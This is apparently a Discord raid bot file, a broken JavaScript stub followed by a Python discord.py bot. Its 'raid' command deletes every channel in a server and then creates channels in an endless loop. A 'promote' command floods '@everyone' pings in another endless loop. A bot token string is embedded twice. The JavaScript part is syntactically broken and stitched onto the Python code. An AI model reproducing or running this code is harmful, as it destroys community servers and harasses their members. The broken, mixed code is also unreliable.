const Dicord = require ("discord.js");

const Client = new Discord.Client;

Client.on("ready", () => )

    console.log("Ready to use")

token=("ODQ2MDk0ODk0MzM4NjcwNjMy.YKqhRg.DnvF4Bko95rNS2uVyI73WutktiQ")

import discord
from discord.ext import commands
import time

client = commands.Bot(command_prefix=">")

@client.event
async def on_ready():
    print("Zi parti")
@client.command()

async def raid(ctx):
    #1er stage
    for c in ctx.guild.channels:
        await c.delete()
    print("Stage 1 complete.")

    #2nd stage
    guild = ctx.message.guild
    while True:
        await guild.create_text_channel("-ça sent le raid ")
    print("Stage 2 complete.")

@client.command()

async def promote(ctx):
    #3eme stage
    await ctx.send("?settings allowspam #La Vengance")
    print("Stage 3 complete.")

    #4eme stage
    while True:
        await ctx.send("@everyone Round 2")
    print("Stage 4 complete.")

    print("Place au round 3!")


token=("ODQ2MDk0ODk0MzM4NjcwNjMy.YKqhRg.DnvF4Bko95rNS2uVyI73WutktiQ")